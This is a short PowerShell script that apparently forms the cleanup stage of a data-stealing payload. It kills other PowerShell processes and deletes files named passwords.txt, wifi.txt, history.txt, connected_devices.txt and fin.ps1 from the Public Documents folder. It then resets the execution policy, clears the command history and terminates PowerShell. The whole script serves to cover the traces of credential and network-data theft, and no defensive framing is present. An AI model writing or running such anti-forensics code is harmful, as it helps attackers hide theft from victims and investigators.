Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process
cd C:\Users\Public\Documents
del passwords.txt
del history.txt
del wifi.txt
del connected_devices.txt
del fin.ps1
Set-ExecutionPolicy restricted -Force
[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
taskkill -F /IM powershell.exe
